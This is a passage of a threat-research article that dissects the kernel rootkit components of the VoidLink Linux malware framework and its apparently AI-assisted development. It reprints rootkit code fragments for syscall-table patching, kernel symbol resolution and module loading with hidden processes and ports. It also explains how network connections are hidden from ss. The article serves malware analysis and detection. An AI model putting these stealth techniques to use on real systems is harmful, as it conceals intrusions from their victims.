-top-32"></span>Introduction</h2>
<p>During a recent investigation, we came across a data dump containing source code, compiled binaries, and deployment scripts for the kernel rootkit components of <a href="https://research.checkpoint.com/2026/voidlink-the-cloud-native-malware-framework/">VoidLink</a>, a cloud-native Linux malware framework first documented by Check Point Research in January 2026. Check Point&#x27;s analysis revealed VoidLink to be a sophisticated, modular command-and-control framework written in Zig, featuring cloud-environment detection, a plugin ecosystem of over 30 modules, and multiple rootkit capabilities spanning userland rootkits (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code>), Loadable Kernel Modules (LKMs), and eBPF. In a <a href="https://research.checkpoint.com/2026/voidlink-early-ai-generated-malware-framework/">follow-up publication</a>, Check Point presented compelling evidence that VoidLink was developed almost entirely through AI-assisted workflows using the TRAE integrated development environment (IDE), with a single developer producing the framework, from concept to functional implant, in under a week.</p>
<p></p>
<p>The data dump we obtained, which we attribute to the same Chinese-speaking threat actor, based on matching Simplified Chinese source comments and Alibaba Cloud infrastructure, contained the raw development history of VoidLink&#x27;s rootkit subsystem. What Check Point described as a deployable stealth module, selected dynamically based on the target kernel version, was laid bare in our data dump as a multigenerational rootkit framework that had been actively developed, tested, and iterated across real targets, spanning CentOS 7 through Ubuntu 22.04.</p>
<p>The rootkit components masquerade under the module name <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vl_stealth</code> (or, in some variants, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">amd_mem_encrypt</code>), consistent with the kernel-level concealment capabilities described in Check Point&#x27;s analysis. Their architecture immediately stood out: Rather than relying on a single technique, the rootkit combines a traditional LKM with eBPF programs in a hybrid design that we’ve rarely encountered in the wild. The LKM handles deep kernel manipulation, syscall hooking via ftrace, and an Internet Control Message Protocol–based (ICMP-based) covert command channel, while a companion eBPF program takes over the delicate task of hiding network connections from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> utility by manipulating Netlink socket responses in userspace memory.</p>
<p>Across the data, we identified at least four distinct generations of VoidLink, each one refining its hooking strategy, evasion techniques, and operational stability. The earliest variant targeted CentOS 7 with direct syscall table patching. The most recent variant, which the developers dubbed &quot;Ultimate Stealth v5&quot; in their comments, introduces delayed hook installation, anti-debugging timers, process kill protection, and XOR-obfuscated module names.</p>
<p>Check Point&#x27;s second publication already established that VoidLink was developed through AI-driven workflows. The rootkit source code we analyzed corroborates and extends this finding: The source files are littered with phased refactoring annotations, tutorial-style comments that explain basic kernel concepts, and iterative version numbering patterns that closely mirror multi-turn AI conversations. Where Check Point observed the macro-level development methodology (sprint planning, specification-driven development), our data dump reveals the micro-level reality of how individual rootkit components were iteratively prompted, tested, and refined.</p>
<p>In this research publication, we walk through the rootkit&#x27;s architecture, trace its evolution across four generations, dissect its most technically interesting features, and provide actionable detection strategies. All Chinese source comments referenced in this analysis have been translated into English.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="discovery-and-initial-triage" class="absolute -top-32"></span>Discovery and initial triage</h2>
<p>At first glance, the sheer volume of files, many with iterative version numbers, like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_ss_v3.bpf.c</code> through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_ss_v9.bpf.c</code>, suggested an active development effort rather than a one-off project. The presence of compiled <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ko</code> files for specific kernel versions, alongside three separate copies of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vmlinux.h</code> BPF Type Format (BTF) headers, confirmed that this code had been built and tested on real systems.</p>
<p>After sorting through the dump, we identified seven logical groupings. Three stand-alone LKM variants in the root directory targeted different kernel generations: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_centos7_v2.c</code> (1,148 lines, targeting CentOS 7&#x27;s kernel 3.10), <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_kernel5x.c</code> (767 lines, targeting kernel 5.x), and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_v5.c</code> (876 lines, the &quot;Ultimate Stealth&quot; variant with delayed initialization). Two production directories, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel5x_new/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lkm_5x/</code>, contained polished variants with module parameters, eBPF companions, and versioned ICMP control scripts. An <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_test/</code> directory contained 10 sequential iterations of ss-hiding eBPF programs and six versions of process-hiding programs, each building on the last, providing a clear record of iterative development. Finally, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">load_lkm.sh</code> provided boot-time persistence with a particularly interesting feature: It scanned <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/*/exe</code> for processes running from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> file descriptors, a telltale sign of fileless implants.</p>
<p>Every source file was annotated entirely in Simplified Chinese. The comments ranged from straightforward function descriptions to detailed phase-numbered fix annotations. For example, the CentOS 7 variant&#x27;s header contained a structured changelog that mapped perfectly to five development phases, translated here:</p>
<pre><code>Phase 1: Security/logic vulnerabilities - bounds checking, UDP ports, memory leaks, byte order
Phase 2: Stealth enhancements - ICMP randomization, /proc/modules, kprobe hiding, log cleanup
Phase 3: Compatibility - dynamic symbol lookup, struct offsets, IPv6, kernel version adaptation

<p>Individual fixes throughout the code were tagged with identifiers like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[1.1]</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[2.1]</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[3.3]</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[5.2]</code>, each corresponding to a specific phase and fix number. We’ll return to the significance of this annotation pattern later, as it provides compelling evidence about the rootkit&#x27;s development methodology.</p>
<p>The operator scripts revealed real infrastructure. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">icmp_ctl.py</code> usage examples referenced two Alibaba Cloud IP addresses, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.149.128[.]10</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">116.62.172[.]147</code>, indicating that VoidLink was being used operationally against targets accessible from Chinese cloud infrastructure. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">load_lkm.sh</code> boot script hard-codes a path to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/kernel5x_new/vl_stealth.ko</code> and configures port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8080</code> to be hidden by default, further suggesting active deployment.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="architecture-a-hybrid-approach" class="absolute -top-32"></span>Architecture: A hybrid approach</h2>
<p>What makes VoidLink architecturally notable is its two-component design. Most Linux rootkits rely on a single mechanism for hiding, whether that’s an LKM hooking syscalls, an eBPF program attached to tracepoints, or a shared object injected via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code>. VoidLink uses both an LKM and an eBPF program, each handling the task for which it is best suited. This hybrid approach is rarely seen in the wild and reflects a deliberate engineering decision.</p>
<p>The LKM component, which masquerades under the module name <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vl_stealth</code> (or, in some variants, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">amd_mem_encrypt</code>), is the backbone of the rootkit. It handles tasks that require deep kernel access: process hiding via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getdents64</code> syscall hooking, file and module trace removal via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code> filtering, network connection hiding via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_show</code> kretprobes, and the ICMP-based command-and-control channel via Netfilter hooks. These operations require manipulating kernel-internal data structures and intercepting kernel functions at a level that only a loaded kernel module can achieve.</p>
<p>The eBPF component handles a single but critical task: hiding network connections from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> utility. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> command doesn’t read from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/tcp</code> as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> does. Instead, it uses Netlink sockets with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SOCK_DIAG_BY_FAMILY</code> protocol to query the kernel&#x27;s socket diagnostic interface directly. This means that the kretprobe technique used to hide connections from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code>, which works by rolling back the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_file</code> output counter, has no effect on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code>.</p>
<p>The developers initially attempted to hide connections from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> using a kretprobe on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inet_sk_diag_fill</code>, returning <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-EAGAIN</code> to suppress individual entries. A comment in the source code, translated from Chinese, explains why they abandoned this approach: &quot;ss command hiding implemented by eBPF module (more stable)&quot;. The kretprobe method caused kernel instability, likely because <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inet_sk_diag_fill</code> is called deep within the Netlink socket processing path, and returning an error code there could corrupt the response chain.</p>
<p>The eBPF solution is elegant. It hooks <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__sys_recvmsg</code> using a kprobe at the entry point and a kretprobe at the return point. On entry, it captures the userspace receive buffer address from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">msghdr</code> structure. On return, it walks the chain of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsghdr</code> structures in that buffer, checking each <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SOCK_DIAG_BY_FAMILY</code> message for hidden source or destination ports. When it finds a match, rather than removing the entry (which would corrupt the Netlink message chain), it extends the previous message&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsg_len</code> field to absorb the hidden entry. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> parser then treats the hidden entry as padding within the previous message and silently skips it. This &quot;swallowing&quot; technique, implemented through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf_probe_write_user</code>, is a creative abuse of a BPF helper originally intended for debugging.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="version-evolution" class="absolute -top-32"></span>Version evolution</h2>
<p>VoidLink evolved through at least four generations, each one adapting to newer kernel defenses while expanding the rootkit&#x27;s capabilities. Tracing this evolution reveals not only the technical challenges the developers faced but also the iterative problem-solving approach, likely aided by a large language model (LLM) that defines this rootkit&#x27;s development history.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="generation-1-the-centos-7-foundation" class="absolute -top-32"></span>Generation 1: The CentOS 7 foundation</h3>
<p>The earliest variant, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_centos7_v2.c</code>, targets CentOS 7 and its venerable 3.10 kernel. At 1,148 lines, it’s the longest file and contains the most extensive comments. This variant uses the oldest and most straightforward hooking technique available to LKM rootkits: direct modification of the syscall table.</p>
<p>On kernel 3.10, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kallsyms_lookup_name()</code> is still exported as a public kernel symbol, so locating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sys_call_table</code> is trivial. The rootkit calls it directly to resolve function addresses. However, the kernel marks the syscall table as read-only, so modifying it requires temporarily disabling the processor&#x27;s write protection bit in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CR0</code> control register:</p>
<pre><code>write_cr0(read_cr0() &amp; ~X86_CR0_WP);  // Disable write protection
sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
write_cr0(read_cr0() | X86_CR0_WP);   // Re-enable write protection</code></pre>
<p>This is a well-known technique with a long history in Linux rootkit development. More interestingly, how does the CentOS 7 variant handle GCC&#x27;s interprocedural optimizations? When GCC inlines or clones functions, it renames them with suffixes like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.isra.0</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.constprop.5</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.part.3</code>. This means a symbol like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">tcp4_seq_show</code> might actually exist in the kernel as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">tcp4_seq_show.isra.2</code>. VoidLink&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">find_symbol_flexible()</code> function handles this by brute-forcing up to 20 variants of each suffix:</p>
<pre><code>static unsigned long find_symbol_flexible(const char *base_name)
{
    unsigned long addr;
    char buf[128];
    int i;

    addr = kallsyms_lookup_name(base_name);
    if (addr) return addr;

    for (i = 0; i &lt;= 20; i++) {
        snprintf(buf, sizeof(buf), &quot;%s.isra.%d&quot;, base_name, i);
        addr = kallsyms_lookup_name(buf);
        if (addr) return addr;
    }

    for (i = 0; i &lt;= 20; i++) {
        snprintf(buf, sizeof(buf), &quot;%s.constprop.%d&quot;, base_name, i);
        addr = kallsyms_lookup_name(buf);
        if (addr) return addr;
    }

    return 0;
}</code></pre>
<p>Anyone who has developed kernel modules for CentOS 7 will recognize the frustration of symbols being renamed by compiler optimizations. The fact that VoidLink handles this systematically, across <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.isra</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.constprop</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.part</code> suffixes, suggests the developers encountered this problem during real-world deployment.</p>
<p>The CentOS 7 variant hooks both <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getdents</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getdents64</code> syscalls, because CentOS 7 userspace tools use both 32-bit and 64-bit directory entry formats. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/modules</code> file is handled separately by replacing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_operations.show</code> function pointer after opening the file through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">filp_open()</code>. This generation also introduces the anti-debugging timer and the self-destruct command, features that persist through all subsequent generations. One notable detail: The variant suppresses all kernel log output by redefining <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pr_info</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pr_err</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pr_warn</code> as no-ops, a simple but effective anti-forensics measure.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="generation-2-adapting-to-kernel-5x" class="absolute -top-32"></span>Generation 2: Adapting to kernel 5.x</h3>
<p>The jump from CentOS 7&#x27;s kernel 3.10 to kernel 5.x required fundamental changes to VoidLink&#x27;s hooking strategy. Two kernel developments forced the developers&#x27; hand: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kallsyms_lookup_name()</code> was unexported starting in kernel 5.7, and the syscall table gained stronger write protections through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CONFIG_STRICT_KERNEL_RWX</code>.</p>
<p>The second generation, found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_kernel5x.c</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lkm_test/main.c</code>, addresses the first problem with a technique known in rootkit development circles as the <em>kprobe trick</em>. Instead of calling <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kallsyms_lookup_name()</code> directly, the rootkit registers a kprobe on it. The kernel&#x27;s kprobe subsystem resolves the symbol address internally during registration and stores it in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kp.addr</code> field. The rootkit reads this address and then immediately unregisters the kprobe:</p>
<pre><code>static int init_symbols(void)
{
    struct kprobe kp = { .symbol_name = &quot;kallsyms_lookup_name&quot; };
    if (register_kprobe(&amp;kp) &lt; 0)
        return -EFAULT;
    kln_func = (kln_t)kp.addr;
    unregister_kprobe(&amp;kp);
    return kln_func ? 0 : -EFAULT;
}</code></pre>
<p>This trick was first popularized by modern rootkits, like Diamorphine, and has become the de facto method for symbol resolution on post–5.7 kernels. Once <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kallsyms_lookup_name</code> is available, the rootkit can resolve any other kernel symbol it needs.</p>
<p>For syscall hooking, Generation 2 abandons direct modification of the syscall table in favor of ftrace. The Linux kernel&#x27;s function tracing framework was designed for performance analysis and debugging, but it provides a convenient API for attaching callbacks to arbitrary kernel functions. VoidLink registers ftrace hooks on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__x64_sys_getdents64</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code>, using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FTRACE_OPS_FL_SAVE_REGS</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FTRACE_OPS_FL_IPMODIFY</code> flags to gain full control over the hooked function&#x27;s execution. The ftrace callback modifies the instruction pointer in the saved register state, redirecting execution to the rootkit&#x27;s handler before the original function runs.</p>
<p>This generation also introduces <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code> hooking to filter sensitive pseudo-files. When a process reads <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/kallsyms</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/modules</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sys/kernel/debug/kprobes/list</code>, the rootkit intercepts the output buffer and removes any lines containing the module name or kretprobe registrations. This is a significant improvement over the CentOS 7 variant&#x27;s approach of hooking <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_operations.show</code> for a single file; the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code> hook provides a centralized filtering mechanism for all sensitive files.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="generation-3-production-readiness" class="absolute -top-32"></span>Generation 3: Production readiness</h3>
<p>The third generation, found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel5x_new/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lkm_5x/</code>, represents the production-ready form of VoidLink. The most visible change is the addition of module parameters that allow the operator to configure the rootkit at load time without needing the ICMP channel:</p>
<pre><code>insmod vl_stealth.ko init_pids=1234 init_ports=8080 stealth=1</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_pids</code> parameter specifies process IDs to hide immediately after loading. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_ports</code> parameter lists ports to hide from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code>. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth</code> flag controls whether the module removes itself from the kernel&#x27;s module list upon initialization. These parameters eliminate the need for a separate ICMP command to configure the rootkit after it loads, thereby reducing the window of vulnerability between module insertion and activation.</p>
<p>This generation also doubles the number of ICMP hook registrations by attaching to both the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NF_INET_PRE_ROUTING</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NF_INET_LOCAL_IN</code> Netfilter chains. The dual registration ensures reliable command reception, regardless of the host&#x27;s network configuration and iptables rules. Most rootkits register on only one Netfilter chain; VoidLink&#x27;s dual approach demonstrates an awareness of operational failures that could occur in diverse network environments.</p>
<p>The most important change in Generation 3 is the delegation of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> hiding to the eBPF companion, which we will examine in detail shortly.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="the-ebpf-innovation-hiding-from-ss" class="absolute -top-32"></span>The eBPF innovation: Hiding from ss</h2>
<p>One of the most technically interesting aspects of VoidLink is how it hides network connections from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> utility. This problem has historically been a challenge for Linux rootkits because <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> query the kernel through entirely different interfaces, meaning a rootkit that defeats one often fails against the other.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> utility reads from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/tcp</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/tcp6</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/udp</code>, and similar pseudo-files. The kernel generates these files via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_file</code> operations, calling functions such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">tcp4_seq_show()</code> for each socket entry. Hiding a connection from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> is straightforward: Install a kretprobe on the relevant <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_show</code> function and, when it returns, check whether the source or destination port matches a hidden port. If it does, roll back the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_file-&gt;count</code> counter to its pre-call value, effectively erasing the line from the output. VoidLink&#x27;s LKM component uses exactly this approach for <code class="px-1.5 py-1 rounded not-prose 